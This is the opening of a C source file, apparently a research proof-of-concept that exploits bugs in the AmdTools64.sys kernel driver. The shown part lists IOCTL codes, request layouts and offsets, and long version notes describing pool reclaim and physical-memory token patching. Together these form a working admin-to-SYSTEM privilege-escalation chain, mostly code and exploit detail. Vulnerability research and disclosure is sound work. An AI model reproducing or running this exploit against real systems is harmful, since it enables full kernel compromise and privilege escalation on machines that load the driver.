/*
 * amd_esc_poc.c -- escalation harness for AmdTools64.sys
 *                 IOCTL 0xFFF028A8 unmap worker with no consumed-state
 *                 check: arbitrary kernel deref + free, staged double free,
 *                 and the reclaim choreography that turns it into an
 *                 admin -> NT AUTHORITY\SYSTEM chain
 *
 *                     mistrust development -- research build
 *
 * GOAL (this file, not in amd_df_poc): the staged double free is proven;
 * here the freed 0x30 'ADIO' chunk is RECLAIMED deterministically by the
 * driver's own capture worker (0xFFF02888), which allocates a second
 * attacker-content buffer from the same bucket. Stage 2 then derefs OUR
 * qwords and frees a LIVE buffer we still hold a user mapping of.
 * Phases (never run past a milestone automatically):
 *   [P1] --ladder / --reclaim / --capture / --alpc : benign measurements
 *   [P2] --paint / --s2        : attacker-chosen deref values (destructive)
 *   [P3]                       : escalation payload (to be built after P2)
 *
 * Verified against AmdTools64.sys md5 f3063aeff8b4ca56c6d870302ae80a0d
 * (AMD driver, base 0x140000000, 2026-10-13 session in IDA).
 *
 * VULNERABLE CODE PATH
 *   IRP_MJ_DEVICE_CONTROL = sub_1400051A0 (dispatch @0x140006430; the only
 *   pre-switch interception is 0xFFF028C0 -> sub_140005750, the command-list
 *   processor). No validation layer at all: the IoControlCode, the lengths
 *   and the SystemBuffer go straight into the switch.
 *   -> sub_1400058D8 (case 0xFFF028A8 at 0x1400061dc, requires
 *      [+0x10] >= 0x21 && [+8] >= 0x21; the ONLY caller, 0x1400061e9)
 *   -> sub_140002CB8 -- the unmap worker, with 0x00 bytes of validation:
 *
 *        block = *(VOID**)(SysBuf + 0x10)          ; the 'ADIO' handle, but
 *                                                  ; taken from the user with
 *                                                  ; ZERO checks and zero
 *                                                  ; consumed-state tracking
 *        mdl   = *(MDL**)(block + 0x10)            ; read site 0x140002cce
 *        MmUnmapLockedPages(*(VOID**)(block + 0x08), mdl)   ; 0x140002cd9
 *        IoFreeMdl(mdl)                                     ; 0x140002ce2
 *        ExFreePoolWithTag(block, 0)                        ; 0x140002ced
 *        *(UINT32*)(SysBuf + 0x0C) = 0                      ; always SUCCESS
 *
 *   Three bugs in one call, all new vs. the reference repo (poc_amdtools64.*
 *   never exercises the deallocate family):
 *
 *   1. DOUBLE FREE (this PoC's target). The driver never marks the 'ADIO'
 *      block consumed and never records having freed it. Unmapping the SAME
 *      legitimate handle twice re-runs the whole worker against freed pool:
 *        - MmUnmapLockedPages(*(block+0x08), *(block+0x10)) dereferences the
 *          IoFreeMdl()-freed MDL -- IoFreeMdl hands MDLs to the lookaside
 *          list, so the fields may be recycled garbage at any time;
 *        - IoFreeMdl(mdl) a second time -- double-free of the MDL itself;
 *        - ExFreePoolWithTag(block, 0) a second time -- double-free of the
 *          0x20-byte nonpaged block, pool-header corruption.
 *      Also: the allocation (sub_140002090, 0x1400020f6) requests tag
 *      'ADIO' (0x4F494441) but the worker frees with tag 0 -- a mismatch
 *      silently tolerated by retail kernels and flagged instantly by
 *      Driver Verifier pool tracking (see --verifier).
 *
 *   2. ARBITRARY FREE / ARBITRARY DEREF (--block ADDR). The handle is fully
 *      attacker-controlled. Supply any kernel address: the worker reads
 *      *(addr+0x08) and *(addr+0x10) (arbitrary kernel-pointer deref, no
 *      user-map validation -- MmUnmapLockedPages bugchecks if the VA is not
 *      a live user mapping) and calls ExFreePoolWithTag(addr, 0) on the
 *      address (arbitrary free of any pool object -> UAF grooming).
 *      (Symbolic execution independently flagged both: "read/write
 *      controllable address" at simstate 0x140002cce and "arbitrary free"
 *      with return address 0x140002cf3, see AmdTools64.sys.json.)
 *
 *   3. NULL PROBE (--null-probe). block = 0: the worker reads (*(0+0x08),
 *      *(0+0x10)) -- page 0 is never mapped on x64, so every call through
 *      this path is a deterministic PAGE_FAULT bugcheck. Crash-on-demand
 *      determinism check only; flag-gated.
 *
 * TRANSPORT (unchanged from the sibling amd_map_poc.c, reversed from
 * sub_1400051A0/sub_1400058D8 raw asm; see that file for the full write-up):
 *   The command IS dwIoControlCode, gate in/out lengths >= 0x21, all these
 *   codes are METHOD_BUFFERED, reply copy-back size = out length (0x21).
 *     DeviceIoControl(hDev, 0xFFF028A8, &req, 0x30, &reply, 0x21, &br, NULL)
 *   Unmap requests need block@+0x10 (the map's reply field). sub_140002CB8
 *   returns status 0 unconditionally -- the driver NEVER tells you a free
 *   was invalid, stale or doubled. That silence is itself part of the bug.
 *
 * IMPACT (admin -> kernel):
 *   Same ACL as the map primitive (SDDL D:P(A;;GA;;;SY)(A;;GA;;;BA)): every
 *   deallocation path is admin-reachable. Double free / arbitrary free of
 *   nonpaged pool is the classic escalation primitive (UAF/grooming); the
 *   MDL double-free path additionally races the lookaside list.
 *
 * SAFETY -- read this before running:
 *   Unlike amd_map_poc, this PoC is BY DESIGN pool-corrupting in every mode
 *   except --verifier (which only reports). The second free targets memory
 *   that may already belong to another owner: expect bugcheck between the
 *   two DeviceIoControl calls or immediately after. Default flow minimizes
 *   the window (the second call is issued back-to-back), but never to zero.
 *   Run on a disposable VM; enable Driver Verifier special pool for
 *   AmdTools64.sys to convert the race into a deterministic, attributable
 *   bugcheck (0x19/0xC4 family) with the freed address in the dump. The
 *   teelog (.log file beside the exe, append mode) survives the crash and
 *   is the field record.
 *
 * INSTALL / LOAD: identical to amd_map_poc v1.2 (CreateServiceW ->
 *   CM_Create_DevNodeW -> CM_Add_IDW -> CM_DRP_SERVICE bind -> best-effort
 *   UpdateDriverForPlugAndPlayDevicesW -> CM_Setup_DevNode(READY) -> poll
 *   interface). Both PoCs share the same audit identity (service AMDTOOLS64,
 *   devnode Root\AMDTOOLSAUDIT\0000), so installing via either is fine.
 *
 * Build (Linux cross):  x86_64-w64-mingw32-gcc -O2 -std=c11 -municode -o amd_esc_poc.exe amd_esc_poc.c -lcfgmgr32 -lsetupapi -lnewdev -ladvapi32
 * Run (Windows, elevated): amd_esc_poc.exe [--install] [--pa N] [--len N]
 *                          [--cache 0|1|2] [--dump]
 *                          [--verify-driver] [--block ADDR] [--null-probe]
 * Phase-1 harness:          [--ladder N] [--reclaim N] [--capture N]
 *                           [--alpc N --alen N] [--paint]
 * Phase-2 trigger:          [--s2 --q8 Q --q16 Q] [--s2-force]
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <stdarg.h>
#include <stddef.h>
#include <setupapi.h>
#include <cfgmgr32.h>
/* CM_Get_Root_DevNode: exported by cfgmgr32.dll, but neither declared in the
 * mingw header nor present in libcfgmgr32.a -- resolve it at runtime. */
static CONFIGRET (WINAPI *get_root_devnode)(DEVINST *, ULONG);
#include <newdev.h>
#include <inttypes.h>
#include <winternl.h>   /* UNICODE_STRING / OBJECT_ATTRIBUTES for the ALPC probe */

#define DEVICE_IFACE_GUID \
    { 0x1232175B, 0x1C34, 0x41FD, { 0xB1, 0x01, 0x34, 0x2D, 0x47, 0xB8, 0x28, 0xAC } }

/* Command codes: dwIoControlCode IS the command (selector in sub_1400058D8) */
#define CMD_MAP      0xFFF028A4   /* arbitrary physical map  (sub_140002090) */
#define CMD_UNMAP    0xFFF028A8   /* unmap + MDL/pool free   (sub_140002CB8) */
#define CMD_CAPTURE  0xFFF02888   /* PA->pool copy capture   (sub_140001E9C);
                                   * CORRECTED v1.2: was 0xFFF02908 (design-
                                   * note error; that code does not exist in
                                   * the 218 switch -- it fell to the default
                                   * STATUS_NOT_SUPPORTED -> GLE 50). Verified
                                   * in the 218 disassembly: cmp edx,0FFF02888h
                                   * -> sub_140001E9C, in>=0x20 out>=0x20,
                                   * reply 0x20 bytes; same DEVREQ layout, allocates the 0x20
                                   * 'ADIO' block AND a second attacker-length
                                   * 'ADIO' buffer whose content is a copy of
                                   * the attacker-chosen physical window; the
                                   * buffer is user-mapped and stays live */
#define CMD_CRREAD   0xFFF02860   /* pure CR read (sub_1400025C4): sel word
                                   * @+0x08; old value -> reply+0x00; NO
                                   * write-back (0xFFF02864 is read-MODIFY-
                                   * WRITE -- do not use for reads). sel=3
                                   * = CR3 = the process kernel DTB */
#define CMD_CONTIGALLOC 0xFFF028AC /* contiguous-buffer worker (sub_140001614):
                                   * req: low PA u64 @+0x00, high PA u64
                                   * @+0x08, page count dword @+0x30, cache
                                   * word @+0x36; reply: PA @+0x10, user VA
                                   * @+0x18 (MmMapLockedPagesSpecifyCache
                                   * UserMode over the SAME pages), MDL
                                   * @+0x20, kernel VA @+0x28; in/out >= 0x38 */
#define CMD_CONTIGFREE  0xFFF028B0 /* release (sub_140001ADC): user VA @+0x18,
                                   * MDL @+0x20, KVA @+0x28, pages @+0x30,
                                   * cache @+0x36 -- same shape as the alloc
                                   * reply buffer */
#define CMD_PHYSREAD 0xFFF0281C   /* arbitrary phys read (sub_140002690):
                                   * PA u64 @+0x00, len word @+0x08 (1..0x100),
                                   * status word @+0x0A (0 = ok), content
                                   * -> +0x0C; in AND out buffers must both be
                                   * >= 0x10C (dispatcher gate) */
#define CMD_PHYSWRITE 0xFFF02820  /* arbitrary phys WRITE (sub_140002FEC):
                                   * same 0x10C layout as CMD_PHYSREAD --
                                   * PA u64 @+0x00, len word @+0x08 (1..0x100),
                                   * content <- +0x0C, status word @+0x0A
                                   * written 0 on success. IDA-verified 218 */
#define CMD_SCAN     0xFFF02824   /* phys-memory scanner (sub_1400029DC):
                                   * in/out >= 0x2122. start PA u64 @+0x00,
                                   * map len u32 @+0x10 (region mapped ONCE),
                                   * stride u32 @+0x14, pattern len @+0x18
                                   * (<=0x100), dump len @+0x1C (<=0x2000),
                                   * pattern @+0x22. Reply reuses the buffer:
                                   * found-PA qword @+0x08, status word @+0x20
                                   * (0 = hit + dump of dumpLen bytes @+0x122,
                                   * 3 = exhausted, 5 = dump map failure,
                                   * 6 = bad params). The walk loop is a
                                   * 32-bit PA-low-dword compare, so every
                                   * window must not cross a 4 GB boundary */
#define CMD_PALLOC   0xFFF0289C   /* MmAllocatePagesForMdl alloc -> user view
                                   * (sub_14000190C, field-audit v5.0.0):
                                   * in/out >= 0x2E. req: LowAddress u64
                                   * @+0x00, HighAddress u64 @+0x08, page
                                   * count dword @+0x28 (TotalBytes = n<<12).
                                   * reply in the SAME buffer: mapped bytes
                                   * @+0x10 (MDL ByteCount<<12), userVa
                                   * @+0x18 (MmMapLockedPagesSpecifyCache
                                   * AccessMode=1, MmCached), pages-MDL
                                   * @+0x20, pages-out dword @+0x28, status
                                   * word @+0x2C (0 ok / 5 alloc failure)  */
#define CMD_PTEAR    0xFFF028A0   /* pages-MDL teardown (sub_140001B6C;
                                   * 0xFFF0286C shares this worker):
                                   * in/out >= 0x2E. userVa u64 @+0x18, mdl
                                   * u64 @+0x20; if mdl != 0 ->
                                   * MmUnmapLockedPages(userVa, mdl) (when
                                   * userVa != 0), MmFreePagesFromMdl(mdl),
                                   * ExFreePoolWithTag(mdl, 0); status word
                                   * @+0x2C written 0. NO consumed state,
                                   * NO validation of either pointer --
                                   * fully attacker-chosen (forged-MDL
                                   * gadget) */
#define SCAN_LEN     0x2122
#define REQ_LEN      0x30         /* InputBufferLength  gate >= 0x21 */
#define TRANS_OUT_LEN 0x21        /* OutputBufferLength gate; copy-back size */

#define TOOL_TITLE        L"amd_esc_poc"
#define TOOL_VERSION      L"v5.1.7" /* v5.1.7: E2-direct LOOKUP route --
 * identification is no longer a sweep: NtQuerySystemInformation
 * (SystemExtendedHandleInformation) -> kernel OBJECT_HEADER of our own
 * OpenProcessToken handle, CR3 via 0xFFF02860, VA->PA by KvaToPa
 * (physread-only page-table walk, 1GB/2MB leaves handled), candidate
 * verified by TokClassifyPage content counts. --tokdirect = benign
 * locator mode (no writes, no maps); --tkpatch runs direct first,
 * CMD_SCAN sweep only as fallback. Motivation: run 10 measured the
 * sweep at 28.5 min (per-boot lottery; the token body even MOVED
 * between sweep passes) -- identification must be seconds, not prayer.
 * v5.1.6: E7b GUI exhibit -- after the
 * E7 whoami proof, spawn a visible process (calc.exe, notepad.exe fallback)
 * under the duplicated SYSTEM primary token; not waited on, not killed.
 * User-mode-only change, no new kernel interactions.
 * v5.1.5: fast sweep RETIRED from the
 * live path -- run 9 pinned corrupt PFN 0x4005 mid-window (windows 1-2
 * at PA 0x4000000+ completed with the floor holding; the 16 KB window's
 * unmap died). Unified with runs 6-8: the A4 user-map leg corrupts the
 * PFN entries of FREE-list pages (contents looked random/moving on
 * every boot because they ARE stale free-list data; token/active pages
 * have mapped clean in every historical run). Bulk user-mapping of
 * census RAM is a PFN-corruption lottery -> tkpatch permanently uses
 * the proven CMD_SCAN sweep (v5.0.2 path, ~6:03 total). TokFastSweepLuid
 * stays as retired evidence code.
 * run 8 crashed at PA 0x1000000 AGAIN with the floor "active": the
 * census MERGES contiguous OK bands, so a span [0x1000000, 0x4xxx000)
 * passed the 'hi <= floor' test and the walk started in the poison
 * region. v5.1.4 clamps the span START to TKFMAP_FLOOR. Boot evidence
 * added: PA 0x1000000 carries DIFFERENT content every boot (entropy
 * blob / 0xFF pattern / JSON text) and reads of it are always harmless;
 * the 0xFFF028A4 user-map of that one page (PFN 0x1000) is what dies
 * (runs 6+7+8, three boots) => content-independent driver/kernel
 * interaction recorded as a finding of its own.
 * --pfndb pinned the run6/7 poison as a 2 MB high-entropy region at PA
 * 0x1000000..0x1200000 (VBS off, not the PFN database, KslD.sys =
 * Microsoft Malware Protection driver only a stack bystander); the
 * 0xFFF028A4 user-map leg over ANY page there bugchecks 0x4E/0x7 on the
 * first mapped page's PFN, at ANY length. The fast sweep now skips
 * every census band below 64 MB (token pool is 0x49xxx000-class; cost
 * 3 of ~310 bands) and keeps the v5.1.1 ramp + flush proof log.
 * run 7 PROVED length is exonerated: the pair bugchecked 0x4E/0x7 on the
 * same PFN 0x1000 with a plain 4 KB window. Constant across both crash
 * sessions: mapped-PA 0x1000000 = PFN 0x1000 (the pair's own first page).
 * Hypothesis: that PA hosts the PFN DATABASE, so the A4->A8 pair corrupts
 * the PFN entry of a page that is itself PFN-database memory. --pfndb
 * reads (never maps) the hypothesis pages + controls to pin the region
 * before any further live-fire map test.
 * the v5.1.0 fast sweep (fixed 32 MB first window at PA 0x1000000)
 * bugchecked 0x4E/0x7 on PFN 0x1000 = the first page of that window.
 * v5.1.1 replaces the fixed 32 MB start with a LENGTH RAMP (4 KB ->
 * 32 MB, doubling only after every map->scan->unmap cycle succeeds)
 * and ProofLogs every map/refuse/unmap leg through FlushFileBuffers
 * so a repeat bugcheck pins the exact length the pair corrupts at.
 * Attribution: the A4->A8 pair at attacker length is the ONLY changed
 * variable; the harness-side loop was audited and is clean.
 *
 * v5.1.0: bulk-map FAST sweep -- E1
 * identification no longer walks CMD_SCAN (the worker caps its window;
 * ~6 min for the RAM census). TokFastSweepLuid maps attacker-LENGTH
 * windows through 0xFFF028A4 (MmMapIoSpace, no cap in the audited
 * worker), pattern-matches the LUID qword IN USER SPACE at memory
 * bandwidth, and releases every window through the intended-path A8
 * teardown (no leaked blocks: the field findings say windows never
 * reclaimed are a driver defect, not our tool's problem). Slow LUID
 * sweep kept as the automatic fallback. Same trial/revert machinery.
 *
 * v5.0.2: E7 verdict check is now
 * case-insensitive (whoami prints lowercase; the 05:39 run showed
 * system-child=no despite a printed [E7] nt authority\system line).
 * v5.0.1: E7 pipe fix -- close the parent's
 * write end BEFORE reading; the 04:19 field run (Sweep -> E3 trial 1 ->
 * E4/E5 PINNED at page 0x77eab000, FIRST trial) blocked forever inside
 * ReadFile because our own wp held the pipe open past the child's exit.
 *
 * v5.0.0: REDESIGN -- exploit the driver's
 * reachable kernel-call family directly (map -> token patch -> SYSTEM),
 * no pool games: new modes --tokscan (benign token census: TokenLUID and
 * own-SID phys sweeps of the census-OK RAM bands, 'Toke' page
 * classification, a bogus-SID negative self-test, NO writes), --tokmap
 * (benign: A4-map the classified pages, dump + E2E phys-vs-window check,
 * intended-path teardown), --tkpatch (GATED: map the pinned token page,
 * UserAndGroups SID -> S-1-5-18 in place through the user window, verify
 * through our OWN handle, CreateProcessWithTokenW child, revert) and
 * --gadget0 (pages-alloc 0xFFF0289C + teardown 0xFFF028A0 pair audit:
 * intended-path teardown observability + no-consumed-state refire
 * exhibit). Escalation technique labeled [prior-art: physmap-class] in
 * every log -- the novelty claim rides on the driver-specific bug
 * inventory, not this technique.
 * Preceded by v4.4.5: [HDRDUMP] geometry fix --
 * buffers read FORWARD from userVa: [userVa-0x10, +0x50), always inside
 * the stale one-page user map. v4.4.4 read userVa-0x60 +0x90, which fell
 * outside the map whenever the body landed low in its page (02:23 boot:
 * body @...010 -> BOTH dumps unreadable, pre-fire baseline lost, the
 * intact 'ADI0' post-fire tag uninterpretable). Also: that 02:23 run was
 * a second M3 fire on an un-reverted boot (user skipped the S2 restore),
 * so its negatives are untrusted -- this build retests on a fresh boot.
 * Preceded by: v4.4.4 [M4d] larger-size serve probe
 * (absorb/coalesce model). 02:04 field decode of M4c: 9 immediate same-
 * bucket allocs (M4b + 8-round burst, replies named) never served the
 * fired 0x710 chunk while fresh allocs marched contiguously into fresh
 * territory 0x2000+ above -- allocator healthy, freed slot never touched;
 * header stayed zeroed, body untouched. Remaining benign explanation:
 * the freed space was merged into a larger free extent that only larger
 * allocs can draw from. M4d paints 6 marker2 qwords at capSrc and issues
 * larger captures (0x780/0x800/0xE00/0x1400), scanning the window qwords
 * for the marker2 prefix; + = absorbed-and-served (v4.5 = merged-size
 * reclaim), x = absorption dead -> second-fire destructive probe or
 * ntoskrnl autopsy. Preceded by
 * v4.4.3: [M4c] burst (8 more same-bucket
 * captures post-M4b, window re-checked each round) + tag-offset fix after
 * the 01:52 HDRDUMP decode: x64 POOL_HEADER tag is at header+4 (userVa-0x0C),
 * hdr[8..16] is the process-billed pointer -- the "E9 AF 0E 5E tag" the field
 * reported was pointer bytes, never a tag. Real 01:52 fact: the tag-0 free
 * ZEROED the entire 0x10 POOL_HEADER ('ADIO' gone, dword0 gone) while the
 * body kept our marker -- NO Flink/Blink ever written -- and one immediate
 * same-bucket alloc did not serve the chunk (fresh capture block landed
 * outside it). M4c splits: served-but-not-first vs stranded-unlisted-vs-
 * header-wiped. Preceded by
 * v4.4.2: [HDRDUMP] pre/post-fire pool-
 * header dumps through the stale window (24H2 fact from the 02:35 run: the
 * dbuf hdr tag slot @-0x08 reads E9 AF 0E 5E -- NOT 'ADIO' -- while the
 * body keeps our marker and M4b shows the chunk is never re-served; this
 * dump settles the header layout + what the tag-0 free actually rewrote).
 * Also: M4b names the fresh capture's reply addresses. Preceded by
 * v4.4.1: M5probe2 x64-layout fix (field
 * crash: v4.4.0 read pid@+0x10 = CycleTime and memcpy'd from CreateTime.lo
 * as a "name pointer" -- AV at ~entry 48, the first with nonzero CycleTime
 * low bits). Real x64 class-5 layout: pid @0x50, ImageName @0x38/0x40;
 * name pointer + NextEntryOffset now bounds-checked. v4.4.0: decisive
 * diagnostics for the
 * M5 reclaim mystery. Field 01:17+01:25 runs (v4.3.2, fresh S2 boot): the
 * preflight + tested capture source carried the chain to M1->M2->M3->M4
 * ALL GREEN (first full fire since run-13) and the box survived with no
 * 0x4E -- but the M5 ladder was a CLEAN NEGATIVE: 49 same-bucket (0x710)
 * NtFilterToken allocs from our own pinned thread, immediately post-fire,
 * never reclaimed the freed 0x700 chunk (window bytes AND hdr tag both
 * unmoved). Something about the token allocator is wrong for this lure.
 * v4.4.0 adds two diagnostics, not a new mechanism:
 *  -- [M5probe2] (pre-chain, benign): walks SystemProcessInformation and
 *     measures the token body each accessible process produces through the
 *     SAME NtFilterToken(n=0) call the lure uses (close-verified). Table
 *     = v4.5 pivot data: another lure source, or bodies are lookaside-
 *     segregated and no NtFilterToken ladder can ever reclaim a generic
 *     free-list chunk.
 *  -- M4b (post-ladder, one call): paint the verified capture source with
 *     fresh bytes, capture the SAME bucket from the same pinned thread,
 *     read the window. marker2 in the window = the free list serves the
 *     fired chunk (token machinery is the suspect); unchanged = the A8
 *     free leg itself does not list-serve the chunk; foreign bytes =
 *     a background alloc took it in between.
 * Plus the M5 lure line now reads the chunk header tag pre/post (still
 * 'ADIO' = free-list resident), and the census-sweep band lines print real
 * MiB (v4.3.2 fixed the preflight lines but missed this one).
 * v4.3.2: capture source TESTED, not
 * guessed. Field 00:10 (v4.3.1, fresh S2 boot): capture=0 in the matrix
 * was a self-test BUG (paint at +0x20 compared against userVa[0..16] --
 * the preflight capture actually transported fine, no GLE); every M1
 * capture then failed GLE=8 at capSrc 0x13fff5010 = anchorPa+0x1010
 * while misaligned probes at the anchor's FIRST page (+0x10/+0x20) all
 * served -- the refusal is per-PAGE: the anchor's second page refused
 * maps. v4.3.2: (1) capture self-test now paints 16 bytes at +0x20 and
 * compares userVa+0x20..; (2) capSrc = first anchor-page candidate
 * (+0,+0x1000,+0x2000) that passes aligned-read + physwrite-paint +
 * real capture + content check (probe len 0x40 keeps the 0x710 bucket
 * untouched); capOK now means "capture verified at the chosen source";
 * (3) the chain aborts BEFORE the len ladder if no candidate passed
 * (rc=3 verdict, anchor contigfreed on both abort paths).
 * Field facts bank: PML4 page refused maps on EVERY boot tested
 * (4 different CR3s), always confirmed by census -- report finding;
 * preflight measured-disable logic is proven (00:10 PML4 @0x3dcde000
 * aligned GLE=8 + lift window GLE=8 = census slot 0x3d dead).
 * v4.3.1: two preflight fixes from the
 * first field run (23:46): (1) the PML4 probes were gated on CensusOK(cr3)
 * BEFORE the full census marked that slot -- only the anchor + 6 mini sites
 * were probed, so the PML4 slot read "unprobed", the walk was disarmed on a
 * stale guess (PML4 @0x24971000 sat inside a census-OK run), and the chain
 * never tested the walk. Fix: PML4 probed unconditionally, its census slot
 * seeded from the result. (2) the census-run lines printed slots/16 as
 * "MiB" (3 MiB for a 864 MiB run): slots * 16 MiB now. Field decode of
 * 23:46 stands: probe DISCOVERY (3rd boot in a row, 'Toke'/+1792 exact),
 * class B = only 10 dead 16 MB slots of ~320, dead-slot skip worked.
 * v4.3.0: map-profile preflight + census
 * route -- run-14 (23:19) decoded: the probe DISCOVERY was fine but the chain
 * ground 2668 GLE=8 scan refusals because nothing knew WHICH RAM regions
 * refuse MmMapIoSpace, and the walk was attempted against a dead band. The
 * 23:19 log also NAILED the refusal axis: REGION, not alignment -- the 5 GiB
 * anchor band served a misaligned physwrite and a misaligned 0x700 capture
 * map in the same run where the PML4 page's refs failed. v4.3.0 changes:
 *  --mapdiag mode: MapPreflight() = ~10 probes + a 16 MB-slot region census
 *  (mini-census at 6 sites first) -> class A lenient / A' page-aligned-only
 *  / B partial-band / C blocked, with a PROFILE proof line; --s2token runs
 *  the preflight first and aborts class C instantly (exit 3, no grind).
 *  walk gated on the preflight (PML4 page must live in a served region);
 *  scan-as-read lift (ReadPhysLift: CMD_SCAN page lift reaches PT offsets
 *  the physread len cap <=0x100 cannot, e.g. PML4E[451] at +0xe18);
 *  ReadPhysBytes ladder per-call adaptive (was latched once -- region
 *  variance mislabeled every later read); CensusSweep: OK-band-ordered
 *  full sweep, pool band (>=2 GB) first (the 23:19 decode's band); RAM top
 *  = census top (kill the 5->6 GiB overshoot); hoisted run-wide transport
 *  breaker (256 consecutive refusals anywhere = verdict + exit 3; the old
 *  counter was span-local and never saw the 2668 accumulate).
 * v4.2.0: probe reads ULONG fields +
 * close-return verification -- v4.1.9's field decode nailed the layout:
 * deltas like +2^32 / +0x700<<32 were high-ULONG carries of ULONGLONG
 * reads across two 4-byte counters; 'Toke' DID move (8/49 n's, open-delta
 * exactly +0x700 at read-offset +12 = the used field's low ULONG at +16,
 * a 1792-byte token body) but the >=16-hit winner threshold missed it
 * because background 'Toke' churn masks the open-delta in most
 * iterations, and v4.1.9 never verified close-return. v4.2.0: compare
 * ULONG fields only (kills the carry artifacts), require open-delta
 * >= 0x100 AND close returns it EXACTLY (churn-proof signature), hits
 * >= 8, winner = most hits then largest max delta in [0x40,0xff0].
 * Layout field-confirmed x4 (base 8, stride 40, tag@+0): 24H2 entries
 * keep the NONPAGED half first (allocs@4, frees@8, used@16) and
 * +24/+32 are the always-zero paged half for nonpaged tags. v4.1.9:
 * full-table tag DISCOVERY --
 * Probe now diffs the ENTIRE tag table (2439 entries) per n: the
 * entry that gains a large used-delta on every open and returns it
 * on close IS the token tag + body size; winner = most hits, then
 * largest max delta in [0x40,0xff0]. Capture fires at the measured
 * size. Earlier: v4.1.8: QsiFetch refetch guard fixed --
 * the "no-progress" guard (need <= g_qsiLen) rejected a REFETCH of the
 * same-size table (need == g_qsiLen on one boot), so BOTH v4.1.6 and
 * v4.1.7 actually read the stale static buffer all along and self-
 * compared zeros. v4.1.7: probe refetches the QSI tag
 * table before BOTH open/close snapshots (v4.1.6 read the static buffer
 * stale = self-comparing zeros; field data CONFIRMED the layout though:
 * bufsz 0x17848 = 8 + 40x2408 exactly, tags at 8/0x30/0x58/0x80 =
 * PdcC/Wfra/Mn1F/ObCI, 'Toke' = entry 1003 @0x9cc0). Layout hypothesis
 * for the zeros: 24H2 entry keeps the NONPAGED half first (used @+16,
 * allocs @+4) and +24/+32 are the always-zero paged half for nonpaged
 * tags. v4.1.6: M5-probe self-calibrating --
 * v4.1.5's guessed QSI layout field-FAILED (matched 'Toke' read
 * used=0/allocs=0, impossible for lifetime counters). v4.1.6: QsiParse
 * raw-finds every 'Toke' occurrence, scores base/stride candidates by
 * printable-tag coverage, dumps the buffer head to the teelog, and a
 * per-n open/close snapshot identifies the used-offset (open delta =
 * token body size, close returns it) -- capture then fires at the
 * measured size. Original v4.1.5: 
 * exact NtFilterToken(n) 'Toke' allocation via SystemPoolTagInformation
 * deltas, then fire the capture at exactly that len. Fresh-snapshot run:
 * M3 status 0 + M4 window reproduced on a virgin boot, but M5 missed --
 * capture len 0xff0 (bucket 0x1000) can never be reclaimed by a token
 * (largest in the n=0..48 ladder ~0x810..0xB20). v4.1.5 fires at the
 * measured token size so the bucket byte-identically matches. Also:
 * v4.1.4: stop-after-first-fire -- run-13 field result: M1->M2(VERIFIED)->M3(status 0)->M4(stale window
 * live) all passed, then the run bugchecked 0x4E PFN_LIST_CORRUPT
 * (P1=0x9A, P2=PFN 0x451D2) 87 s after the first-ever M3 fire, while the
 * sweep continued for the next len. v4.1.4: after the first fire, if the
 * M5 ladder completes without a reclaim, STOP the run instead of
 * sweeping more (proof-logged so the outcome survives teelog buffering).
 */
/*
 * v4.1.2: run-10 (20:13 boot) decode -- that boot rejects multi-page MmMapIoSpace (capture lens 0xff0..0xe30 at
 * +0x200 all GLE=8; the one in-page fit 0xdf0 SUCCEEDED) and even 4 KB
 * windows over in-use RAM; single-page maps over the locked anchor pages
 * still work. Fixes: (1) marker at +0x1010 inside the anchor's page 2 ->
 * every ladder capture is single-page by construction; (2) sweeps tile in
 * whole pages (seed spans are unaligned qword hits) and abort after 64
 * consecutive page-aligned 4 KB rejections instead of looping for hours.
 * v4.1.1: CR3 sanity fix -- sel=3 returns
 * RAW __readcr3() with PCID bits 0..11 (+NOFLUSH bit 63) on Win11; mask to
 * the DTB (0x000FFFFFFFFFF000) instead of rejecting -- the exact-4K sanity
 * was the v4.1 walk-fallback cause. (IDA: sub_140001060 case 3, no mask.)
 * v4.1: THE WALK ROUTE -- CR3 (0xFFF02860
 * sel=3, field-proven in E1.5) + phys reads translate ANY KVA to its exact
 * PA with a 4-level page-table walk. Capture reply names the ADIO block
 * KVA, so M1 (leak dataKVA/dataPA/MDL) and M2 (donor pair) are ~8 transport
 * calls with ZERO scanning; the 6 GB pattern scans (~30 min/sweep, one per
 * fresh boot -- the cause of the v4.0.2 30-min stall) demoted to fallback.
 * Block-verification unchanged: len byte + reply userVa read back from the
 * block PA, data buffer E2E = physread(dataPA) == user window RPM.
 * v4.0.3: M5 lure root fix -- NtFilterToken needs a REAL token handle (run-9:
 * pseudo-handle -4 got 0xc0000008 and zeroed the ladder) -> OpenProcessToken
 * self handle; self-seeding span table, sweep heartbeat, [M1]/[M2] tags.
 * v4.0.2: donor = SECOND capture's pair (contig pair was PFN-poison for the
 * A8 worker: contig alloc ProbeAndLocks IoModifyAccess, A8 never
 * MmUnlockPages -> 0x4E 0x9A PFN_LIST_CORRUPT) */
#define TOOL_BRAND        L"ADIOLOTTO (mistrust development)"
#define TOOL_CON_TITLE    L"mistrust dev :: amd_esc_poc"

/* audit install identity: kernel service + root devnode created by --install.
 * The devnode's hardware ID must match the genuine WHQL-signed INF
 * (amdtools.inf, DriverVer 1.7.16.218: %AmdTools_Desc%=AmdTools64_Inst,
 * *AMDTOOLSDEV) so the driver store can bind its package to this node:
 * AddService then creates and ASSOCIATES the AmdTools64 service, writes the
 * class/desc and the device SDDL, and AddDevice runs. The instance ID stays
 * audit-named; only the matchable identity changed. */
static const WCHAR AUDIT_SVC[]  = L"AMDTOOLS64";
static const WCHAR AUDIT_NODE[] = L"Root\\AMDTOOLSAUDIT\\0000";
static const WCHAR AUDIT_HWID[] = L"*AMDTOOLSDEV";

/* 0x30-byte request/reply copied into the METHOD_BUFFERED SystemBuffer.
 * Layout verified in sub_140002090 (map) and sub_140002CB8 (unmap). */
#pragma pack(push, 1)
/* v5.0.0: 0x2E-byte request/reply pairs for the 0xFFF0289C pages-alloc
 * (sub_14000190C) and the 0xFFF028A0/0xFFF0286C teardown (sub_140001B6C).
 * Both dispatch gates are in/out >= 0x2E; pack(1) pins every offset. */
typedef struct _PAGEALLOCREQ {
    UINT64 lowPa;    /* +0x00 in : LowestAcceptableAddress           */
    UINT64 highPa;   /* +0x08 in : HighestAcceptableAddress          */
    UINT64 mapBytes; /* +0x10 out: MDL pages << 12                   */
    UINT64 userVa;   /* +0x18 out: user view of the pages            */
    UINT64 mdl;      /* +0x20 out: the pages MDL                     */
    UINT32 pages;    /* +0x28 in : TotalBytes = pages << 12          */
    WORD   status;   /* +0x2C out: 0 ok / 5 alloc failure            */
} PAGEALLOCREQ, *PPAGEALLOCREQ;

